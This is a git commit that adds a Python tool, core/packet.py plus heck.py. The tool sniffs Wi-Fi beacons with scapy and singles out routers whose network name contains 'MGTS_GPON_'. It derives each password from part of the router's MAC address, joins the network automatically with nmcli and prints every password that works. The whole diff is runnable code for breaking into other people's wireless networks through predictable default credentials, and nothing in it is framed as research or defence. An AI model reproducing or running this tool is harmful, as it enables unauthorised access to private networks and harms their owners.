a62b3cc3eb8faba7457d02576b92449bfd2ad352
xhda <example.gmail.com>
2017-06-28 00:56:03 +0300

    Begin

---
+++ core/packet.py
@@ -0,0 +1,71 @@
+import re
+
+from subprocess import Popen, PIPE
+from multiprocessing import Process, Queue
+from scapy.layers.dot11 import Dot11, Dot11Elt
+
+BROADCAST_BSSID = 'FF:FF:FF:FF:FF:FF'
+MGTS_MASK_ESSID = 'MGTS_GPON_'
+
+class PacketHandler(object):
+    def __init__(self, power, connect_int):
+        self.power_signal = power
+        self.parsed_accesses_points = []
+        self.weak_signal_mgts_accesses_points = []
+
+        self.connect_queue = Queue()
+        self.process_connect_to_access_point = Process(
+                                        target=self.connect_to_the_access_point,
+                                        args=(self.connect_queue,
+                                              connect_int, ))
+        self.process_connect_to_access_point.start()
+
+
+    def parser_elements(self, packet):
+        bssid = packet[Dot11].addr3.upper()
+        essid = packet.info.decode('utf-8')
+        power = -(256 - ord(packet.notdecoded[-2:-1]))
+
+        if bssid in BROADCAST_BSSID or essid is '':
+            return
+
+        if bssid in self.parsed_accesses_points:
+            return
+
+        if bssid in self.weak_signal_mgts_accesses_points:
+            if power >= self.power_signal:
+                self.weak_signal_mgts_accesses_points.remove(bssid)
+
+        item_access_point = None
+        channel = int(ord(packet[Dot11Elt:3].info))
+
+        print bssid, power, essid, channel
+
+        if MGTS_MASK_ESSID in essid:
+            if power >= self.power_signal:
+                item_access_point = (essid, re.sub(':', '', bssid.lower()[6:]))
+                print('BSSID: {} ESSID: {}'.format(bssid, essid))
+                self.connect_queue.put(item_access_point)
+                self.parsed_accesses_points.append(bssid)
+            else:
+                self.weak_signal_mgts_accesses_points.append(bssid)
+        else:
+            self.parsed_accesses_points.append(bssid)
+
+    def connect_to_the_access_point(self, queue, connect_int):
+        while True:
+            try:
+                item_queue = queue.get()
+
+                command = 'nmcli -w 12 dev wifi con {} password {}'.format(*item_queue)
+                command = command.split(' ')
+                sub_proc = Popen(command, stdout=PIPE).communicate()
+                if 'Connection with UUID' in sub_proc[0]:
+                    print('''Successful Connect:
+                        ESSID: {}
+                        PASSWORD: {}'''.format(*item_queue))
+                    stt = Popen(['nmcli', 'dev', 'disconnect', connect_int],
+                                stdout=PIPE).communicate()
+
+            except KeyboardInterrupt:
+                break
---
+++ heck.py
@@ -0,0 +1,61 @@
+import os
+import sys
+import time
+import signal
+import argparse
+
+from random import randrange
+from multiprocessing import Process
+
+from scapy.all import sniff
+from scapy.layers.dot11 import Dot11Beacon
+
+from core.packet import PacketHandler
+
+class ScapyScanner(PacketHandler):
+    def __init__(self, scan_int, power, connect_int):
+        super(ScapyScanner, self).__init__(power, connect_int)
+        self.process_channel_hop = Process(target=self._channel_hopper)
+        self.scan_int = scan_int
+
+    def _packet_filter(self, packet):
+        if packet.haslayer(Dot11Beacon):
+            self.parser_elements(packet)
+
+    def _signal_handler(self, signal, frame):
+        self.process_channel_hop.terminate()
+        self.process_channel_hop.join()
+
+    def _channel_hopper(self):
+        while True:
+            try:
+                channel = randrange(1, 14)
+                os.system('iw dev {} set channel {}'.format(self.scan_int, channel))
+                time.sleep(1.15)
+            except:
+                pass
+
+    def run(self):
+        self.process_channel_hop.start()
+        try:
+            signal.signal(signal.SIGINT, self._signal_handler)
+            sniff(iface=self.scan_int, lfilter=self._packet_filter)
+        except KeyboardInterrupt:
+            sys.exit()
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-scan_int', help='interface for scan wireless')
+    parser.add_argument('-power', type=int, help='limit by power access point signal ')
+    parser.add_argument('-con_int', help='interface for connect an access point')
+    apt = parser.parse_args()
+    object_scanner = ScapyScanner(apt.scan_int, apt.power, apt.con_int)
+    try:
+        print
+        object_scanner.run()
+    except Exception:
+        pass
+
+if __name__ == '__main__':
+    main()
